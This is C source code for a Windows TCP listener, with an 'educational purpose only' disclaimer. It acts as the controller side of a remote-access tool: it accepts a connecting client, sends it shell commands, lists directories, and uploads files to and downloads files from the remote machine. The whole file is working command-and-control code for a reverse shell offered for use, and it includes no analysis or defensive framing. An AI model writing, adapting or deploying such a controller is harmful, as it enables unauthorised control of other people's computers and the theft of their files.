/*
* Created By: EH
* -----------------------
* Educational purpose only             
* I'm not responsible for your actions 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define BUFF_LEN 9000

int get_char_len( char* in ) {
    int output = 0;
    for ( int i = 0; in[i] != '\0'; i++, output++ );

    return output;
}


int is_file_exist( char* name ) {
    FILE* fptr;

    if ( (fptr = fopen(name, "rb")) == NULL ) {
        return 1;
    }
    fclose(fptr);

    return 0;
}


int download_file( SOCKET sock ) {
    FILE* fptr; 
    char name[BUFF_LEN];
    int bytesRecvd;

    bytesRecvd = recv(sock, name, sizeof(name), 0);
    
    if (bytesRecvd <= 0) 
    {
        return 1;
    }

    printf("filename -> %s\n", name);
    if( (fptr = fopen(name, "ab")) == NULL )
    {
        printf("error");
        return 1;
    }
    
    char buffer[1];
    printf("[*]Downloading...\n");
    while ( (bytesRecvd = recv(sock, buffer, sizeof(buffer), 0)) > 0 ) {
        fwrite(buffer, sizeof(buffer), 1, fptr);
        memset(buffer, 0, sizeof(buffer));
    }

    printf("[*]Finished\n");
    
    fclose(fptr);

    return 0;
}



int upload_file( char* filename, SOCKET sock ) {
    FILE* fptr; 
    char buffer[1];
    
    memset(buffer, 0, sizeof(buffer));
    printf("filename -> [%s]\n", filename);
    if( (fptr = fopen(filename, "rb")) == NULL )
    {
        printf("error_file\n");
        return 1;
    }

    send(sock, filename, strlen(filename) + 1, 0);
    Sleep(5000); 
    printf("[*]Sending File\n");
    while ( fread(buffer, sizeof(buffer), 1, fptr) > 0 ) {
        send(sock, buffer, sizeof(buffer), 0);
    }

    printf("[*]Finished\n");
    closesocket(sock);
    fclose(fptr);

    return 0;
}


int ls_dir( SOCKET sock ) {
    int bytesRecvd;
    char buffer[1000];
    
    while ( (bytesRecvd = recv(sock, buffer, sizeof(buffer), 0)) > 0 ) {
        printf("%s", buffer);
        send(sock, "done", sizeof("done"), 0);
        memset(buffer, 0, sizeof(buffer));
    }

    return 0;
}


int first_word( char* found, char* command ) {
    int size = get_char_len(found);

    if ( size >= get_char_len(command) ) {
        for ( int i = 0; i < size; i++ ) {
            if (found[i] == ' ' && command[i] == ' ' || found[i] == ' ' && command[i] == '\0'
            || found[i] == '\n' && command[i] == '\0' ) 
            {
                return 0;
            }
            else if ( found[i] != command[i] ) {
                return 1;
            }
        }   
    }
    else {
        return 1;
    }

    return 0;
}



int serversoc( char* ip, int port ) {
    WSADATA wsadata;
    SOCKET server, client;
    SOCKADDR_IN serveraddr, clientaddr;
    int iresult;
    int bytesRecvd;
    int code;
    int i;
    int count;
    char out_msg[BUFF_LEN];

    iresult = WSAStartup(MAKEWORD(2, 0), &wsadata);

    if ( iresult != 0 ) {
        printf("[-]Startup error\n");
        WSACleanup();
        return 1;
    }

    serveraddr.sin_family = AF_INET;
    serveraddr.sin_port = htons(port);
    serveraddr.sin_addr.S_un.S_addr = inet_addr(ip);

    server = socket(AF_INET, SOCK_STREAM, 0);
    
    if ( server == INVALID_SOCKET ) {
        printf("[-]INVALID_SOCKET\n");
        closesocket(server);
        WSACleanup();
        return 1;
    }

    bind(server, (SOCKADDR*)&serveraddr, sizeof(serveraddr));
    iresult = listen(server, 0);

    if ( iresult == SOCKET_ERROR ) {
        printf("SOCKET_ERROR\n");
        closesocket(server);
        WSACleanup();
        return 1;
    }
    
    
    char buffer[BUFF_LEN];
    char msg[BUFF_LEN];
    int clientaddrsize = sizeof(clientaddr);

    printf("Listening -> %s %d\n", ip, port);
    client = accept(server, (SOCKADDR*)&clientaddr, &clientaddrsize);
    
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(msg, 0, sizeof(msg));
        memset(out_msg, 0, sizeof(out_msg));
        
        printf("/> ");
        fgets(msg, BUFF_LEN, stdin);

        if ( first_word(msg, "upload_file") == 0 ) {
            count = 0;
            for (i = 12; msg[i] != '\0'; i++)
            {
                out_msg[count] = msg[i];
                count++;
            }
            out_msg[count-1] = '\0';

            if (is_file_exist(out_msg) != 0)
            {
                printf("[-]File Does not exist\n");
                continue;
            }

            send(client, msg, sizeof(msg), 0);

            code = upload_file(out_msg, client);
            printf("\n");
            client = accept(server, (SOCKADDR*)&clientaddr, &clientaddrsize);
            
            continue;            
        }
        else if ( first_word(msg, "download_file") == 0 ) {
            send(client, msg, sizeof(msg), 0);

            code = download_file(client);
            printf("\n");

            if (code != 0) {
                printf("error\n");
            }

            client = accept(server, (SOCKADDR*)&clientaddr, &clientaddrsize);
            continue;
        }
        else if ( strcmp(msg,"ls\n") == 0 || strcmp(msg,"dir\n") == 0 ) {
            send(client, msg, sizeof(msg), 0);
            ls_dir(client);
            client = accept(server, (SOCKADDR*)&clientaddr, &clientaddrsize);
            continue;
        }
        else if ( strcmp(msg, "exit_client\n") == 0 ) {
            send(client, msg, sizeof(msg), 0);
            break;
        }
        else if ( strcmp(msg, "exit\n") == 0 ) {
            break;
        }

        send(client, msg, sizeof(msg), 0);
        bytesRecvd = recv(client, buffer, sizeof(buffer), 0);
        
        printf("\n");
        puts(buffer);
    }

    printf("\n[*]Closing Socket\n");
    closesocket(server);
    closesocket(client);
    WSACleanup();
    return 0;
}


int main( int argc, char* argv[] ) {
    
    if ( argc < 3 ) {
        printf("usage: ./servertcp [IP] [PORT]");
        return 1;
    }

    serversoc(argv[1], atoi(argv[2]));
    printf("[*]Disconnected\n");
    return 0;
}
